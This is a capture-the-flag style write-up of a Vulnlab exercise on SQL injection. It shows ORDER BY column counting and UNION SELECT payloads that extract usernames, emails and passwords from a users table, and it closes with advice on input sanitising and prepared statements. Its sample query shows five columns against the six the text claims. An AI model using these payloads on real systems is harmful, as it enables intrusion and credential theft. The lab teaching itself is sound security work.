---
title: "[Vulnlab] SQL Injection - Find the passwords"
date: 2025-03-13 15:00:00 -500 
categories: [Vulnlab, SQL Injection - Login]
tags: [soc,redteam,sqli,docker,vulnlab]
author: Christoph K
---

# Situation:

We have a list of users and a `search bar` where we can input our `SQLi`. We also have access to the `PHP source code`.

![Login](assets/img/vulnlab/sqli/passwords/01.png)

Our mission - `passwords`


## Find out columns

First, I would start by finding out how many columns this table has. This is important because the `password` column might be present but hidden.

We can do this by incrementally increasing the `ORDER BY` value until we get an error:

`' ORDER BY 1 --  `
`' ORDER BY 2 --  `


We continue this process until an error occurs, indicating the table does not have that many columns. In this case, we can go up to `6`.




## Using `UNION` to merge tables

Now that we know the columns, we can try to merge the tables with following command:

`' UNION SELECT 1,2,3,4,5,6 FROM users -- `

The whole `SQL`statement could look like that:

```sql
SELECT id, username, email, name, surname FROM users WHERE username = '' 
UNION SELECT 1,2,3,4,5,6 FROM users -- '
```

![passwords](assets/img/vulnlab/sqli/passwords/02.png)




## Getting the `passwords` column into the table


Now that we know the number of columns and are able to merge the correct number of columns into our table, we need to display the `passwords` column.

We can try it like that:


`' UNION SELECT 1,2,3,password,5,6 FROM users -- `


Which number we replace does not matter, it will just replace the column like in the picture before.

It should be like that now:


![passwords](assets/img/vulnlab/sqli/passwords/03.png)



## Make is pretty


Now that we have the passwords attached to our original table, we can make it prettier. We move the `username` column to number 2 and `mail` to 3. 

```sql

' UNION SELECT 1,username,email,4,password,6 FROM users -- 
```

![passwords](assets/img/vulnlab/sqli/passwords/04.png)


# Conclusion:

By leveraging SQL Injection, we successfully extracted the passwords column from the database. This demonstrates why user input should always be sanitized and why using prepared statements or ORM frameworks can help prevent SQLi vulnerabilities.

